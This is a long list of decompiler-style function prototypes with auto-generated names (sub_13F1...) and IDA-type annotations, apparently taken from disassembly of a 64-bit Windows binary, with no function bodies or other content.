__int64 __fastcall sub_13F113E00(__int64, __int64);
__int64 __fastcall sub_13F113F60(__int64, __int64);
__int64 __fastcall sub_13F113FF0(__int64, __int64);
__int64 __fastcall sub_13F114080(__int64, unsigned __int64);
__int64 __fastcall sub_13F114170(__int64, unsigned __int64);
_QWORD *__fastcall sub_13F114260(_QWORD *, char);
_QWORD *__fastcall sub_13F1142E0(_QWORD *, char);
_QWORD *__fastcall sub_13F114320(_QWORD *, char);
_QWORD *__fastcall sub_13F1143A0(_QWORD *, char);
_QWORD *__fastcall sub_13F114420(_QWORD *, char);
_QWORD *__fastcall sub_13F114460(_QWORD *, char);
__int64 __fastcall sub_13F1144A0(__int64, __int64, __int64);
__int64 __fastcall sub_13F1144B0(__int64, __int64, __int64);
__int64 __fastcall sub_13F114600(__int64, __int64);
__int64 __fastcall sub_13F114630(__int64, __int64, __int64);
__int64 __fastcall sub_13F1146B0(__int64, __int64, __int64);
__int64 __fastcall sub_13F114840(__int64);
__int64 __fastcall sub_13F114850(__m128i *, __m128i *, const __m128i *, __int64, const __m128i *, unsigned __int64);
char __fastcall sub_13F114C40(__int64, __int64, int *);
char __fastcall sub_13F114D80(__int64, const __m128i *, __int64, __int64);
char __fastcall sub_13F114E00(__int64, const __m128i *, __int64, _DWORD *);
unsigned __int64 __fastcall sub_13F114E80(__m128i *, _QWORD *, unsigned __int64 *, unsigned __int64, unsigned __int64 *, unsigned __int64);
__int64 (__fastcall **__fastcall sub_13F115220(__int64, __int64))();
unsigned __int64 __fastcall sub_13F1152D0(_QWORD *, unsigned __int64 *, unsigned __int64 *);
unsigned __int64 __fastcall sub_13F1171E0(_QWORD *, unsigned __int64 *, unsigned __int64 *);
unsigned __int64 __fastcall sub_13F117260(_QWORD *, unsigned __int64 *, unsigned __int64 *);
unsigned __int64 __fastcall sub_13F117490(_QWORD *, unsigned __int64 *, unsigned __int64 *);
unsigned __int64 __fastcall sub_13F117C30(_QWORD *, unsigned __int64 *, unsigned __int64 *);
__int64 __fastcall sub_13F118A90(_QWORD *, unsigned __int64 *, unsigned __int64 *);
unsigned __int64 __fastcall sub_13F118AC0(_QWORD *, unsigned __int64 *, unsigned __int64 *);
unsigned __int64 __fastcall sub_13F118BB0(_QWORD *, unsigned __int64 *, unsigned __int64 *);
unsigned __int64 __fastcall sub_13F118F80(_QWORD *, unsigned __int64 *, unsigned __int64 *, unsigned __int64);
unsigned __int64 __fastcall sub_13F119FD0(unsigned __int64 *, unsigned __int64 *, unsigned __int64 *);
unsigned __int64 __fastcall sub_13F11A060(_QWORD *, unsigned __int64 *, unsigned __int64 *, unsigned __int64);
unsigned __int64 __fastcall sub_13F11A240(_QWORD *, unsigned __int64 *, unsigned __int64 *, unsigned __int64);
unsigned __int64 __fastcall sub_13F11A750(_QWORD *, unsigned __int64 *);
unsigned __int64 __fastcall sub_13F11B8B0(_QWORD *, unsigned __int64 *);
unsigned __int64 __fastcall sub_13F11B920(_QWORD *, unsigned __int64 *);
unsigned __int64 __fastcall sub_13F11BAC0(_QWORD *, unsigned __int64 *);
__int64 __fastcall sub_13F11BFE0(__int64);
__int64 __fastcall sub_13F11C050(__int64);
__int64 __fastcall sub_13F11C0C0(__int64, __int64, __int64, __int64, __int64, __int64);
__int64 __fastcall sub_13F11C270(__int64, __int64, __int64, __int64, __int64, __int64);
__int64 __fastcall sub_13F11C2A0(__int64, __int64);
__int64 __fastcall sub_13F11C2E0(_QWORD *, unsigned __int64);
__int64 __fastcall sub_13F11C3B0(__int64);
_QWORD *__fastcall sub_13F11C3F0(_QWORD *);
__int64 __fastcall sub_13F11C4E0(__int64, __int64, __int64);
__int64 __fastcall sub_13F11C520(__int64, __int64);
__int64 __fastcall sub_13F11C560(__int64, __int64, __int64);
__int64 __fastcall sub_13F11C590(__int64, __int64, __int64);
__int64 __fastcall sub_13F11C690(__int64, __int64, __int64);
__int64 __fastcall sub_13F11C6B0(__int64, __int64, __int64);
__int64 __fastcall sub_13F11C770(__int64);
__int64 __fastcall sub_13F11C790(__int64, __int64);
__int64 __fastcall sub_13F11C820(__int64, __int64, unsigned __int64, int);
__int64 __fastcall sub_13F11CA30(unsigned __int64 *, unsigned __int64, __int64);
__int64 __fastcall sub_13F11CA90(__int64, __int64, __int64);
__m128i *__fastcall sub_13F11CB10(__m128i *, __int64, _QWORD *, const __m128i *, __int64, const __m128i *, unsigned __int64);
__int64 __fastcall sub_13F11CFD0(__int64, __int64, __int64, __int64);
__int64 __fastcall sub_13F11D180(__int64 *, __int64, __int64);
void __fastcall sub_13F11D1C0(__m128i *, const __m128i *, __int64, __int64, __int64);
__int64 __fastcall sub_13F11D2F0(__int64, __int64, __int64);
__int64 __fastcall sub_13F11D430(__int64, __int64, __int64, __int64, __int64);
__int64 __fastcall sub_13F11D450(__int64, __int64);
__int64 __fastcall sub_13F11D4D0(__int64, __int64);
__int64 __fastcall sub_13F11D4E0(__int64);
void **__fastcall sub_13F11D4F0(__int64, __int64, unsigned __int64, int);
void **__fastcall sub_13F11D700(__int64, __int64, unsigned __int64, int);
bool __fastcall sub_13F11D7A0(__int64, __int64, __int64);
__int64 __fastcall sub_13F11D810(__int64);
__int64 __fastcall sub_13F11D820(__int64, __int64);
__int64 __fastcall sub_13F11D850(__int64, __int64, __int64);
char *__fastcall sub_13F11D960(__int64, __int64, __int64);
char __fastcall sub_13F11DAE0(__int64, __int64, __int64);
char __fastcall sub_13F11EB30(__int64, unsigned __int64);
__int64 (__fastcall *(**sub_13F11EB60())[4])();
__int64 __fastcall sub_13F11EB70(__int64);
__int64 __fastcall sub_13F11EB80(__int64, __int64);
__int64 __fastcall sub_13F11ECC0(__int64, __int64);
__int64 __fastcall sub_13F11EDB0(__int64);
__int64 __fastcall sub_13F11EDC0(__int64, __int64, __int64);
__int64 __fastcall sub_13F11EEE0(__int64, unsigned __int64);
__int64 __fastcall sub_13F11EF70(__int64, __int64, __int64);
_BOOL8 __fastcall sub_13F11F6C0(__int64);
char __fastcall sub_13F11F810(__int64, __int64);
_BOOL8 __fastcall sub_13F11F850(__int64, __int64);
__int64 __fastcall sub_13F11F9D0(__int64, int);
__int64 __fastcall sub_13F11FBB0(__int64, __int64, __int64);
__int64 __fastcall sub_13F11FC80(__int64, __int64, __int64);
__int64 __fastcall sub_13F11FD00(__int64, __int64, __int64);
unsigned __int64 __fastcall sub_13F11FDF0(__int64, unsigned __int64);
__int64 __fastcall sub_13F120000(__m128i *, unsigned __int64 *, unsigned __int64 *, unsigned __int64 *, unsigned __int64 *, unsigned __int64);
__int64 __fastcall sub_13F1200D0(__int64, _QWORD *);
__int64 __fastcall sub_13F120120(__int64, __int64);
__int64 (__fastcall *(**sub_13F120160())[4])();
__int64 __fastcall sub_13F120170(__int64);
__int64 __fastcall sub_13F120230(__int64, __int64 (__fastcall *(**)[4])());
__int64 __fastcall sub_13F1202F0(__int64, __int64);
__int64 __fastcall sub_13F120450(__int64, __int64);
__int64 __fastcall sub_13F1205B0(__int64, __int64, __int64);
char __fastcall sub_13F120710(__int64, __int64, __int64);
__int64 __fastcall sub_13F1208C0(__int64, __int64, __int64);
__int64 __fastcall sub_13F1209F0(__int64, __int64, __int64);
unsigned __int64 __fastcall sub_13F120AC0(unsigned __int64 *, _QWORD *, __int64, unsigned __int64 *, unsigned __int64 *, unsigned __int64);
__int64 __fastcall sub_13F120E60(_QWORD *, unsigned __int64);
__int64 __fastcall sub_13F120ED0(__int64, __int64, __int64);
__int64 __fastcall sub_13F120FA0(__int64, __int64, __int64);
__int64 __fastcall sub_13F121140(__int64, __int64);
__m128i *__fastcall sub_13F1211E0(__int64, __int64, __int64, __int64);
__int64 __fastcall sub_13F1213E0(__int64, __int64, __int64);
__int64 __fastcall sub_13F1215D0(__int64, unsigned __int64);
__int64 __fastcall sub_13F121660(__int64, __int64, __int64, __int64);
__int64 __fastcall sub_13F1218D0(__int64, __int64, unsigned __int64);
__int64 __fastcall sub_13F1219C0(unsigned __int64 *, __m128i *, unsigned __int64 *, unsigned __int64);
unsigned __int64 __fastcall sub_13F121B80(_QWORD *a1, _QWORD *a2, unsigned __int64 *a3, unsigned __int64 *a4, unsigned __int64 a5);
__int64 __fastcall sub_13F121EC0(_QWORD *a1, _QWORD *a2, unsigned __int64 *a3, unsigned __int64 *a4, unsigned __int64 a5);
unsigned __int64 __fastcall sub_13F121F90(_QWORD *, _QWORD *, unsigned __int64 *, unsigned __int64);
__int64 __fastcall sub_13F1220B0(__int64, __int64, __int64);
__int64 __fastcall sub_13F1220C0(__int64, __int64, __int64);
__int64 __fastcall sub_13F122150(__int64, __int64);
__int64 __fastcall sub_13F122180(unsigned __int64);
__int64 __fastcall sub_13F122210(__int64, __int64);
unsigned __int64 (__fastcall *sub_13F122230())(_QWORD *a1, unsigned __int64 *a2, unsigned __int64 *a3, unsigned __int64 a4);
void __fastcall sub_13F122320(char *, unsigned __int64, unsigned __int64);
unsigned __int64 __fastcall sub_13F122390(__int64 a1, __int64 a2, int a3);
void __fastcall sub_13F1223F0(__int64, __int64, __int64, __int64, unsigned int);
__int64 __fastcall sub_13F122670(__int64);
__int64 __fastcall sub_13F122680(__int64, __int64);
__int64 __fastcall sub_13F1227E0(__int64, __int64);
__int64 __fastcall sub_13F122910(__int64, __int64);
__int64 __fastcall sub_13F1229C0(__int64, __int64);
__int64 __fastcall sub_13F1231D0(__int64, __int64, __int64);
__int64 __fastcall sub_13F123320(__int64, __int64, __int64);
__int64 __fastcall sub_13F1234D0(__int64);
__int64 __fastcall sub_13F1234E0(__int64, __int64, __int64);
__int64 (__fastcall *(**sub_13F123540())[4])();
__int64 __fastcall sub_13F123550(unsigned __int64 *, unsigned __int64);
__int64 __fastcall sub_13F123630(__int64);
__int64 __fastcall sub_13F123660(__int64, __int64, __int64, __int64);
unsigned __int64 __fastcall sub_13F123740(__int64, unsigned __int64);
_QWORD *__fastcall sub_13F1237F0(_QWORD *);
__int64 __fastcall sub_13F1238F0(__int64, __int64);
__int64 __fastcall sub_13F123940(__int64, const __m128i *, __int64);
__int64 __fastcall sub_13F123A90(__int64, const __m128i *, __int64);
__int64 __fastcall sub_13F123BE0(__int64, __int64, __int64);
__int64 __fastcall sub_13F123DB0(__int64, __int64, __int64);
__int64 __fastcall sub_13F123F80(__int64, __int64, __m128i *, __int64, _QWORD *, __int64);
__int64 __fastcall sub_13F124220(__int64, __int64, __m128i *, __int64, _QWORD *, __int64);
__int64 __fastcall sub_13F1244C0(__int64);
unsigned __int64 __fastcall sub_13F124570(_QWORD *);
__int64 (__fastcall **__fastcall sub_13F1246F0(_QWORD *))();
__int64 __fastcall sub_13F124750(__int64, char);
_QWORD *__fastcall sub_13F1247E0(_QWORD *, char);
_QWORD *__fastcall sub_13F124810(_QWORD *, char);
__int64 __fastcall sub_13F1248A0(__int64);
__int64 __fastcall sub_13F1248B0(__int64);
__int64 __fastcall sub_13F1248D0(__int64);
__m128i *__fastcall sub_13F1248F0(__int64, __m128i *);
void __fastcall __noreturn sub_13F124910(__int64);
void __noreturn sub_13F124930();
__int64 __fastcall sub_13F124990(__int64, __int64, __int64);
__int64 __fastcall sub_13F124A10(__int64, __int64);
__int64 __fastcall sub_13F124B70(__int64, __int64);
char __fastcall sub_13F124C00(__int64, const __m128i *, __int64, _QWORD *);
__int64 *__fastcall sub_13F124C80(__int64 *);
__int64 *__fastcall sub_13F124EC0(__int64 *);
__int64 (__fastcall **__fastcall sub_13F125080(_QWORD *, __int64))();
__int64 (__fastcall **__fastcall sub_13F1251A0(__int64, __int64))();
__int64 __fastcall sub_13F125240(__int64, __int64, __int64, __int64);
__int64 __fastcall sub_13F125730(_QWORD *, __int64);
__int64 __fastcall sub_13F1258C0(__int64, __int64);
void __noreturn sub_13F125960();
char __fastcall sub_13F1259C0(__int64, __int64, __int64);
_QWORD *__fastcall sub_13F1263C0(__int64, _QWORD *);
__int64 __fastcall sub_13F126450(__int64, __int64);
_QWORD *sub_13F126470();
__int64 __fastcall sub_13F126480(__int64);
__int64 __fastcall sub_13F126490(__int64);
__int64 __fastcall sub_13F1264A0(__int64);
__int64 __fastcall sub_13F1264B0(__int64);
__int64 __fastcall sub_13F1264C0(__int64);
__int64 __fastcall sub_13F1264D0(__int64);
__int64 __fastcall sub_13F1264E0(__int64);
__int64 __fastcall sub_13F126500(__int64);
__int64 __fastcall sub_13F126510(__int64);
__int64 __fastcall sub_13F126530(__int64);
__int64 __fastcall sub_13F126540(__int64);
__int64 __fastcall sub_13F126550(__int64);
__int64 __fastcall sub_13F126570(__int64, __m128i *, __int64, _QWORD *);
__int64 __fastcall sub_13F126EB0(__int64, __m128i *, __int64, _QWORD *);
void **__fastcall sub_13F127220(__int64, __int64, int, __int64);
_BOOL8 __fastcall sub_13F127480(__int64, __int64);
char __fastcall sub_13F127550(__int64);
char __fastcall sub_13F127590(__int64);
__int64 __fastcall sub_13F1275D0(__int64, __int64, __int64);
__int64 __fastcall sub_13F1276B0(_QWORD *);
__int64 __fastcall sub_13F127790(_QWORD *);
__int64 __fastcall sub_13F127870(__int64);
__int64 __fastcall sub_13F127880(__int64);
__int64 __fastcall sub_13F127890(__int64, __int64, __int64);
__int64 __fastcall sub_13F1278A0(__int64, _QWORD *);
__int64 __fastcall sub_13F1278E0(); // weak
__int64 __fastcall sub_13F127920(); // weak
__int64 __fastcall sub_13F127960(__int64);
_QWORD *sub_13F127980();
__int64 __fastcall sub_13F127A80(__int64);
__int64 __fastcall sub_13F127A90(__int64 a1, __int64 a2);
__int64 __fastcall sub_13F127AA0(__int64 a1, __int64 a2);
__int64 __fastcall sub_13F127AB0(__int64 a1, __int64 a2);
__int64 __fastcall sub_13F127AC0(__int64, __int64);
__int64 __fastcall sub_13F127AD0(__int64 a1, __int64 a2);
__int64 __fastcall sub_13F127AE0(__int64 a1, __int64 a2);
__int64 __fastcall sub_13F127AF0(__int64 a1, __int64 a2);
__int64 __fastcall sub_13F127B00(__int64 a1, __int64 a2);
__int64 __fastcall sub_13F127B10(__int64);
__m128i *__fastcall sub_13F127B80(__m128i *);
void __noreturn sub_13F128060();
__int64 __fastcall sub_13F1280C0(_BYTE *, __int64, __int64);
bool __fastcall sub_13F128130(__int64, __int64, unsigned int);
bool __fastcall sub_13F128A80(__int64);
_QWORD *__fastcall sub_13F128B10(_QWORD *);
_QWORD *__fastcall sub_13F128C80(_QWORD *, const __m128i *);
__int64 __fastcall sub_13F128CB0(__int64, const __m128i *);
__int64 __fastcall sub_13F128E90(__int64, __int64);
__int64 __fastcall sub_13F128ED0(__int64, __int64, __int64, char, int, const __m128i *, const __m128i *);
__int64 __fastcall sub_13F128FE0(__int64, __int64, __int64, __int64, __int64);
_QWORD *__fastcall sub_13F129188(__int64, char);
_QWORD *__fastcall sub_13F1291A0(_QWORD *, char);
__int64 __fastcall sub_13F1291E0(_QWORD *);
__int64 __fastcall sub_13F129230(__int64, __int64, __int64);
char __fastcall sub_13F129270(__int64, __int64, unsigned __int8, unsigned int);
char __fastcall sub_13F1292E0(__int64, __int64, unsigned int, unsigned __int8);
__int64 __fastcall sub_13F129350(__int64, __int64, __int64, __int64, int, char);
__int64 __fastcall sub_13F1293D0(__int64, __int64, __int64, __int64, int, char);
__int64 __fastcall sub_13F129450(__int64, __int64, __int64, __int64, int, char);
__int64 __fastcall sub_13F1294A0(_QWORD *, __int64, _QWORD *, __int64, __int64, char);
__int64 __fastcall sub_13F129520(_QWORD *, _QWORD *);
__int64 __fastcall sub_13F129550(__int64, __int64);
__int64 __fastcall sub_13F129580(__int64, __int64);
char __fastcall sub_13F1295C0(_DWORD *, unsigned __int8, int, unsigned __int8);
char __fastcall sub_13F129670(__int64, unsigned __int8, unsigned int, unsigned __int8);
void __fastcall sub_13F1296E0(unsigned __int64 *);
__int64 __fastcall sub_13F129810(_QWORD *, unsigned __int64 *);
char __fastcall sub_13F129880(_BYTE *);
__int64 __fastcall sub_13F1298B0(__int64, __int64, int);
void __fastcall sub_13F129910(__int64, __int64, unsigned int);
char __fastcall sub_13F129950(unsigned __int64 *, char, char);
char __fastcall sub_13F1299E0(__int64, __int64, unsigned __int8);
__int64 __fastcall sub_13F129A00(__int64, __int64);
__int64 __fastcall sub_13F129AC0(__int64, __int64);
__int64 __fastcall sub_13F129B90(__int64, __int64);
bool __fastcall sub_13F129C10(_DWORD *, int, unsigned __int8);
char __fastcall sub_13F129CD0(__int64, unsigned int, unsigned __int8);
__int64 __fastcall sub_13F129D20(); // weak
__int64 __fastcall sub_13F129D60(__int64, __int64, __int64);
__int64 __fastcall sub_13F129D90(_QWORD *, __int64, __int64);
__int64 __fastcall sub_13F129DE0(__int64, __int64, __int64);
__int64 __fastcall sub_13F129E10(_DWORD *, int, __int64, __int64, int, char, __int64);
unsigned __int64 __fastcall sub_13F129EA0(_QWORD *, const __m128i *, unsigned __int64);
unsigned __int64 __fastcall sub_13F129F10(_QWORD *, unsigned __int64, unsigned __int64);
unsigned __int64 __fastcall sub_13F129F80(__int64 *a1, __int64 a2, __int64 a3, int a4, char a5);
__int64 __fastcall sub_13F12A110(__int64, __int64, __int64, unsigned int, char);
__m128i *__fastcall sub_13F12A180(__int64 a1, const __m128i *a2, unsigned __int64 a3);
__int64 __fastcall sub_13F12A220(_DWORD *, const __m128i *, __int64, int, char, char);
__int64 __fastcall sub_13F12A7A0(__int64, __int64, __int64, unsigned int, char);
__int64 __fastcall sub_13F12A810(_QWORD *, __int64, __int64);
unsigned __int64 __fastcall sub_13F12A860(_QWORD *a1, __int64 a2);
__int64 __fastcall sub_13F12A990(__int64, __int64, __int64, __int64, char);
__int64 __fastcall sub_13F12A9E0(__int64 *, __int64, __int64 *, __int64, char);
__int64 __fastcall sub_13F12AA30(__int64, __int64);
__int64 __fastcall sub_13F12AA90(__int64);
_QWORD *__fastcall sub_13F12AAB0(_QWORD *, char);
char __fastcall sub_13F12AB10(__int64, __m128i *, __int64, __m128i *);
char __fastcall sub_13F12AB20(__int64, __m128i *, __int64, __m128i *);
char __fastcall sub_13F12AC70(__int64, unsigned __int8 *, __int64, __int64);
unsigned int **__fastcall sub_13F12AD1C(unsigned int **, _DWORD *);
_DWORD **__fastcall sub_13F12ADAC(_DWORD **, unsigned int);
unsigned __int64 __fastcall sub_13F12AE84(__int64, __int64, unsigned __int64);
__m128i *__fastcall sub_13F12AEF8(int a1, __m128i *a2, __int64 a3, const __m128i *a4, unsigned __int64 a5);
__int64 __fastcall sub_13F12AFC4(_QWORD *, _QWORD *);
__int64 __fastcall sub_13F12B098(_QWORD *, _QWORD *);
__m128i *sub_13F12B17C(__int64 a1, __m128i *a2, ...);
unsigned __int64 __fastcall sub_13F12B3C4(__int64, __m128i *, const __m128i *, __m128i *, unsigned __int64, char);
__m128i *__fastcall sub_13F12B874(__int64, __m128i *);
bool __fastcall sub_13F12B8E0(unsigned __int64, unsigned __int64);
__int64 __fastcall sub_13F12BA00(unsigned int);
__int64 sub_13F12BA08();
__int64 sub_13F12BC34();
__int64 sub_13F12BD30();
__int64 sub_13F12BD50();
__int64 sub_13F12BD70();
__int64 sub_13F12BD90();
bool __fastcall sub_13F12BDB0(int);
__int64 __fastcall sub_13F12BDB8(__int64, __int64);
__int64 __fastcall sub_13F12BE34();
_DWORD **__fastcall sub_13F12BE64(__int64, __m128i *, const __m128i *, __m128i *);
unsigned __int64 __fastcall sub_13F12CDE4(__int64, const __m128i *, unsigned int);
__int64 sub_13F12E420();
__int64 __fastcall sub_13F12E430(__int64, unsigned __int8, unsigned __int64);
unsigned __int64 __fastcall sub_13F12E450(unsigned __int64);
__int64 __fastcall sub_13F12E4D0(__int64);
__int64 __fastcall sub_13F12E4E0(__int64);
__int64 __fastcall sub_13F12E550(_QWORD); // weak
__int64 __fastcall sub_13F12E560(__int64, const __m128i *, const __m128i *);
void __fastcall sub_13F12E630(__int64, __int64);
void __fastcall sub_13F12E7D0(__int64, __int64);
void __fastcall sub_13F12E9B0(_QWORD *, __int64 *);
__int64 __fastcall sub_13F12EC20(__int64, __int64, unsigned __int64, int, char);
__int64 __fastcall sub_13F12EE00(__int64, __int64, unsigned __int64, int, char);
__int64 __fastcall sub_13F12F060(__int64, __int64, unsigned __int64, int, char);
__m128i *__fastcall sub_13F12F250(__int64, __m128i *);
unsigned __int64 __fastcall sub_13F12F2B0(_DWORD **, __int64, unsigned __int64);
__int64 __fastcall sub_13F12F390(__int64, unsigned __int64 *, __int64);
void __fastcall sub_13F12F4B0(_DWORD *);
void __fastcall sub_13F12F4E0(_OWORD *);
__int64 __fastcall sub_13F12F500(_DWORD *, _DWORD *);
__int64 __fastcall sub_13F1306E0(__int128 *, unsigned int *);
__int64 __fastcall sub_13F131390(_DWORD *, _DWORD *);
__int64 __fastcall sub_13F1313F0(__int128 *, unsigned int *);
__int64 __fastcall sub_13F131450(__int64, __int64);
_QWORD *__fastcall sub_13F131540(_QWORD *, __int64);
__int64 __fastcall sub_13F1315A0(_QWORD *);
__int64 __fastcall sub_13F1315D0(__int64, __int64);
_QWORD *__fastcall sub_13F131600(__int64, char);
_QWORD *__fastcall sub_13F131610(_QWORD *, char);
__int64 __fastcall sub_13F131670(__int64);
_QWORD *__fastcall sub_13F131740(_QWORD *);
__int64 __fastcall sub_13F131800(__int64, __int64);
__int64 __fastcall sub_13F131920(__int64, __int64, __int64 *, __int64, __int64, char);
__int64 __fastcall sub_13F131A10(_QWORD *, __int64, __int64 *, __int64, __int64, char);
__int64 __fastcall sub_13F131B00(__int64 *, __int64 *);
__int64 __fastcall sub_13F131BC0(__int64);
__int64 __fastcall sub_13F131BF0(__int64);
__int64 __fastcall sub_13F131C80(_QWORD *, _BYTE *);
__int64 __fastcall sub_13F131D10(__int64, __int64, __int64);
__int64 __fastcall sub_13F131DD0(__int64, __int64);
bool __fastcall sub_13F131E90(_QWORD *);
_QWORD *__fastcall sub_13F131EB0(_QWORD *, __int64);
__int64 __fastcall sub_13F131F00(_QWORD *);
__int64 __fastcall sub_13F131F30(__int64, _BYTE *);
__int64 __fastcall sub_13F131F70(__int64, __int64, __int64);
__int64 __fastcall sub_13F132030(__int64, __int64);
__int64 __fastcall sub_13F1320F0(__int64, const __m128i *, unsigned __int64);
__int64 __fastcall sub_13F132280(__int64, __int64, unsigned __int64 *, __int64, char);
__int64 __fastcall sub_13F132460(_QWORD *, __int64, unsigned __int64 *, __int64, char);
_QWORD *__fastcall sub_13F1325A0(_QWORD *, const __m128i *);
__int64 __fastcall sub_13F1325D0(__int64, const __m128i *);
__int64 __fastcall sub_13F1327B0(_DWORD *, _QWORD *);
__int64 __fastcall sub_13F132810(__int64 *, __int64);
__int64 __fastcall sub_13F132850(_QWORD *);
__int64 __fastcall sub_13F132860(_DWORD *, __int64, unsigned __int64);
void __fastcall sub_13F132A20(__int64 *, const __m128i *, unsigned __int64);
__int64 __fastcall sub_13F132BE0(__int64, unsigned __int64);
__int64 __fastcall sub_13F132C90(__int64);
_DWORD *__fastcall sub_13F132E00(__int64);
_DWORD *__fastcall sub_13F132E40(__int64);
__int64 __fastcall sub_13F132EA0(__int64, char);
__int64 __fastcall sub_13F132F50(__int64, char);
__m128i *__fastcall sub_13F132FD0(__int64, __m128i *);
__m128i *__fastcall sub_13F133010(_QWORD *);
void __fastcall sub_13F1330E0(__int64, __int64, __int64, unsigned __int64);
__int64 __fastcall sub_13F133200(__int64, unsigned int *);
char *__fastcall sub_13F133210(__int64, const __m128i *, unsigned __int64);
void __fastcall sub_13F133350(__int64);
unsigned __int64 __fastcall sub_13F133370(__int64, unsigned __int64);
__int64 __fastcall sub_13F1333A0(__int64, __int64, const __m128i *, unsigned __int64, _BYTE *, unsigned __int64, __int64);
__int64 __fastcall sub_13F133590(__int64, __int64, _BYTE *, unsigned __int64, __m128i *, __int64);
bool __fastcall sub_13F1338C0(__int64, const __m128i *, unsigned __int64);
void __fastcall sub_13F133BE0(unsigned __int64, unsigned __int64, const __m128i *, unsigned __int64);
void __fastcall sub_13F133F90(unsigned __int64, unsigned __int64, unsigned __int64);
__int64 sub_13F134280();
__int64 __fastcall sub_13F134290(__int64 *, __int64, __int64);
__int64 __fastcall sub_13F134410(__int64 *, unsigned __int64, __int64);
__int64 __fastcall sub_13F1345A0(__int64, __int64, __int64);
__int64 __fastcall sub_13F134610(__int64, __int64, __int64);
unsigned __int64 *__fastcall sub_13F134690(unsigned __int64 *, unsigned __int64);
__int64 *__fastcall sub_13F134790(__int64 *, unsigned __int64);
unsigned __int64 __fastcall sub_13F134840(__int64);
__int64 __fastcall sub_13F134880(__int64);
void __fastcall sub_13F1348C0(__int64);
unsigned __int64 __fastcall sub_13F134990(_QWORD *);
unsigned __int64 __fastcall sub_13F134A30(_QWORD *);
unsigned __int64 __fastcall sub_13F134AD0(_QWORD *);
unsigned __int64 __fastcall sub_13F134B20(_QWORD *);
__int64 __fastcall sub_13F134BB0(__int64, __int64, __int64);
_QWORD *__fastcall sub_13F134C20(_QWORD *, char);
_QWORD *__fastcall sub_13F134C60(_QWORD *, char);
__int64 __fastcall sub_13F134CA0(__int64, __int64, __int64, __int64, __int64, __int64);
__int64 __fastcall sub_13F134D00(__int64 *, __int64, __int64, __int64, __int64, __int64);
__int64 __fastcall sub_13F1351A0(__int64, __int64, __int64, __int64);
__int64 __fastcall sub_13F135220(__int64 *, __int64, __int64);
__int64 __fastcall sub_13F135390(__int64, __int64, __int64, __int64);
void __fastcall sub_13F135410(__int64, __int64, __int64, __int64, unsigned int);
void __fastcall sub_13F135460(__int64 *, __int64, __int64, __int64, unsigned int);
__int64 __fastcall sub_13F135AE0(__int64, __int64, __int64, __int64);
__int64 __fastcall sub_13F135BB0(__int64, __int64, __int64, __int64);
unsigned __int64 __fastcall sub_13F135C90(__int64, _QWORD *, _QWORD *);
__int64 __fastcall sub_13F135CD0(__int64, __int64 (__fastcall ***)(_QWORD, _QWORD), __int64 (__fastcall ***)(_QWORD, _QWORD));
__int64 __fastcall sub_13F135D10(__int64 *, unsigned __int64);
void __fastcall sub_13F135DA0(__int64 *);
void __fastcall sub_13F135E60(__int64);
__int64 __fastcall sub_13F135F20(__int64, __int64, __int64, __int64);
__int64 __fastcall sub_13F135FA0(__int64, __int64, __int64, __int64);
unsigned __int64 __fastcall sub_13F136060(__int64, unsigned __int64);
unsigned __int64 __fastcall sub_13F1360D0(__int64, unsigned __int64);
__int64 __fastcall sub_13F136150(__int64, __int64, __int64);
__int64 __fastcall sub_13F136190(__int64, __int64, __int64);
__int64 __fastcall sub_13F1361E0(__int64, __int64, __int64);
__int64 __fastcall sub_13F1362B0(__int64 *, const __m128i *, __int16 *);
const __m128i *__fastcall sub_13F1363C0(__int64, unsigned __int64, __int64);
__int64 __fastcall sub_13F1365C0(__int64, __int64, __int64, __int64, int);
__int64 __fastcall sub_13F136660(__int64 **);
unsigned __int64 __fastcall sub_13F1366E0(_QWORD *);
__int64 __fastcall sub_13F136810(__int64, __int64, unsigned __int64);
_OWORD *__fastcall sub_13F1368A0(__int128 *, _OWORD *, __int64);
__int64 __fastcall sub_13F136920(__int64, __int64, __int64, __int64, __int64, __int64);
void __fastcall sub_13F136A90(__int64);
_BOOL8 __fastcall sub_13F136E70(__int64 a1);
__int64 __fastcall sub_13F136EE0(__int64, __int64, __int64, __int64, __int64);
bool __fastcall sub_13F137550(__int64);
bool __fastcall sub_13F1377C0(__int64 a1);
bool __fastcall sub_13F137E00(__int64 a1, __int64 a2);
__int64 __fastcall sub_13F1384E0(__int64, __int64);
__int64 __fastcall sub_13F1386E0(__int64, __int64, __int64, __int64);
__int64 __fastcall sub_13F1389B0(__int64, unsigned int);
__int64 __fastcall sub_13F138E90(__int64, __int64, __int64, __int64, __int64, __int64, __int64);
char __fastcall sub_13F139030(_QWORD *, __int64);
__int64 __fastcall sub_13F1392D0(__int64);
bool __fastcall sub_13F1392E0(__int64 a1, __int64 a2, unsigned int a3);
__int64 sub_13F139590();
__int64 sub_13F1397A0();
int __fastcall sub_13F139920(_QWORD *, unsigned __int16, __int64, __int64, unsigned __int16);
bool __fastcall sub_13F139B50(__int64 a1, unsigned int a2);
bool __fastcall sub_13F139BE0(__int64, __int64, int);
__int64 __fastcall sub_13F139C70(__int64 *, __int64, __int64, __int64);
__int64 __fastcall sub_13F139D00(_QWORD *, _QWORD *, unsigned __int64);
__int64 __fastcall sub_13F139F00(__int64, unsigned __int64);
void __noreturn sub_13F139F70();
unsigned __int64 __fastcall sub_13F139F90(__int64, unsigned __int64);
__int64 __fastcall sub_13F13A000(__int64, __int64, __int64);
_OWORD *__fastcall sub_13F13A040(unsigned __int64 *, _OWORD *, __int128 *, __int128 *);
void __fastcall sub_13F13A2A0(unsigned __int64 *, unsigned __int64, char);
_BOOL8 __fastcall sub_13F13A4D0(__int64, __int64, __int64, __int64);
_BOOL8 __fastcall sub_13F13A520(__int64, __int64, __int64, __int64);
__m128i *__fastcall sub_13F13A570(__m128i *, const __m128i *);
__int16 __fastcall sub_13F13ABC8(const __m128i *, __int64, __m128i *, __int64);
__int64 __fastcall sub_13F13AE48(const __m128i *, __int64, __m128i *);
__int64 __fastcall sub_13F13AF90(__m128i *, unsigned __int64 *, __int64);
__int64 __fastcall sub_13F13BE70(__int64, __int64, __int64, __int64, __int64, __int64, int, _BYTE *, unsigned __int64);
__int64 __fastcall sub_13F13BF20(__int64, __int64, unsigned int *);
__int64 __fastcall sub_13F13BFA0(__int64, __int64, __int64 *);
_QWORD *__fastcall sub_13F13C020(_QWORD *, __int64, __int64, __int64);
_QWORD *__fastcall sub_13F13C130(_QWORD *, __int64, __int64, __int64);
_QWORD *__fastcall sub_13F13C240(_QWORD *, __int64, __int64, __int64);
_QWORD *__fastcall sub_13F13C380(_QWORD *, __int64, __int64, __int64);
